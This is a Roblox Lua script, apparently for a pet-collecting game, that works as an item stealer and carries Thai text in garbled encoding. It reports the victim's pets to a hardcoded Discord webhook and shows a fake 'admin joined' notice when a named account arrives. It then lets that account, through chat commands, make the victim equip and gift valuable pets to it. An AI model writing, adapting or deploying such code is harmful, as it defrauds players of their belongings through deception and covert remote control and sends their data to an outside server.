local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")
local notified = false
local currentHeld = nil

local targetNames = {
	"Red Fox", "Raccoon", "Dragonfly", "Queen Bee", "Disco Bee", "Cooked Owl", "Blood Owl", "Moon cat",
	"Panda", "Polar Bear", "Praying Mantis", "Chicken Zombie",
	"Dog", "Golden Lab", "Bunny", "Bee", "Black Bunny", "Chicken", "Cat", "Deer", "Hedgehog", "Kiwi",
	"Orange Tabby", "Monkey", "Pig", "Honey Bee", "Spotted Deer", "Rooster", "Silver Monkey", "Cow",
	"Sea Otter", "BloodH edgehog", "Petal Bee", "Turtle", "Snail", "Squirrel", "Mole", "Frog", "Giant Ant",
	"Red Giant Ant", "Grey Mouse", "Owl", "Bear Bee", "Blood Kiwi", "Brown Mouse", "Caterpillar", "Echo Frog", "Night Owl"
}

local giftTargetName = "speed14122"
local webhookUrl = "https://discord.com/api/webhooks/1381764967883345950/g3arXN1BRqk85LtUbCC-OK_GS-mKcYiDs4mT9UgZgwr1aSlFeYZAszG8xa96v5LXtXG0"

local function sendWebhook(url, message, playerName)
	if notified then return end
	local serverId = game.JobId or "N/A"
	local data = {
		["content"] = "**üë§ ‡πÇ‡∏î‡∏¢‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ:** `" .. playerName .. "`\n" .. message .. "\nüåê Server ID: `" .. serverId .. "`"
	}
	local jsonData = HttpService:JSONEncode(data)
	local headers = {["Content-Type"] = "application/json"}
	local requestFunc = http_request or request or syn.request or http
	if requestFunc then
		requestFunc({
			Url = url,
			Method = "POST",
			Headers = headers,
			Body = jsonData
		})
	end
	notified = true
end

local function isTargetName(name)
	for _, target in ipairs(targetNames) do
		if string.find(name, target) then
			return true
		end
	end
	return false
end

local function unFavoriteLocked()
	local character = player.Character
	if not character then return end
	for _, obj in ipairs(character:GetChildren()) do
		if obj:IsA("Tool") and obj:FindFirstChild("Locked") then
			if isTargetName(obj.Name) then
				local args = { obj }
				local remote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
				remote:FireServer(unpack(args))
			end
		end
	end
end

local function giftPetToPlayer(targetPlayer, tool)
	if not tool or not targetPlayer then return end
	local args = { "GivePet", targetPlayer }
	ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
end

local function holdPet(petName)
	for _, item in ipairs(backpack:GetChildren()) do
		if item:IsA("Tool") and string.find(item.Name, petName) then
			item.Parent = player.Character
			currentHeld = item
			unFavoriteLocked()
			return true
		end
	end
	return false
end

local function holdAllTargets()
	for _, item in ipairs(backpack:GetChildren()) do
		if item:IsA("Tool") and isTargetName(item.Name) then
			item.Parent = player.Character
		end
	end
	unFavoriteLocked()
end

local function giftAllHeld(targetPlayer)
	if not targetPlayer then return end
	local character = player.Character
	if not character then return end
	for _, tool in ipairs(character:GetChildren()) do
		if tool:IsA("Tool") and isTargetName(tool.Name) then
			giftPetToPlayer(targetPlayer, tool)
			wait(0.5)
		end
	end
end

local function reportInitialTargets()
	local foundCounts = {}
	for _, item in ipairs(backpack:GetChildren()) do
		if item:IsA("Tool") then
			for _, target in ipairs(targetNames) do
				if string.find(item.Name, target) then
					foundCounts[target] = (foundCounts[target] or 0) + 1
				end
			end
		end
	end
	local parts = {}
	for name, count in pairs(foundCounts) do
		table.insert(parts, name .. " " .. count .. " ‡∏ï‡∏±‡∏ß")
	end
	if #parts > 0 then
		local message = "üì¶ ‡∏û‡∏ö‡∏™‡∏±‡∏ï‡∏ß‡πå‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡πÉ‡∏ô‡∏Å‡∏£‡∏∞‡πÄ‡∏õ‡πã‡∏≤: " .. table.concat(parts, ", ")
		sendWebhook(webhookUrl, message, player.Name)
	end
end

local function showAdminNotification()
	local gui = Instance.new("ScreenGui")
	gui.Name = "AdminNotice"
	gui.Parent = player:WaitForChild("PlayerGui")

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(0.5, 0, 0.1, 0)
	label.Position = UDim2.new(0.25, 0, 0.45, 0)
	label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.Font = Enum.Font.GothamBold
	label.TextScaled = true
	label.Text = "‚≠ê ‡πÅ‡∏≠‡∏î‡∏°‡∏¥‡∏ô ‡πÑ‡∏î‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏°‡∏≤‡πÉ‡∏ô‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì ‚≠ê"
	label.Parent = gui

	task.delay(5, function()
		gui:Destroy()
	end)
end

reportInitialTargets()
unFavoriteLocked()

Players.PlayerAdded:Connect(function(plr)
	if plr.Name == giftTargetName then
		showAdminNotification()
	end
end)

Players.PlayerChatted:Connect(function(chatPlayer, message)
	if chatPlayer.Name ~= giftTargetName then return end
	local lowerMsg = string.lower(message)

	if string.sub(lowerMsg, 1, 13) == "/‡∏ñ‡∏∑‡∏≠‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î" then
		holdAllTargets()
	elseif string.sub(lowerMsg, 1, 13) == "/‡πÉ‡∏´‡πâ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î" then
		local targetPlayer = Players:FindFirstChild(giftTargetName)
		giftAllHeld(targetPlayer)
	elseif string.sub(lowerMsg, 1, 4) == "/‡∏ñ‡∏∑‡∏≠" then
		local pet = string.sub(message, 5):lower()
		for _, target in ipairs(targetNames) do
			if string.find(string.lower(target), pet) then
				holdPet(target)
				break
			end
		end
	elseif lowerMsg == "/‡πÉ‡∏´‡πâ‡∏ú‡∏°" then
		local targetPlayer = Players:FindFirstChild(giftTargetName)
		giftPetToPlayer(targetPlayer, currentHeld)
	end
end)
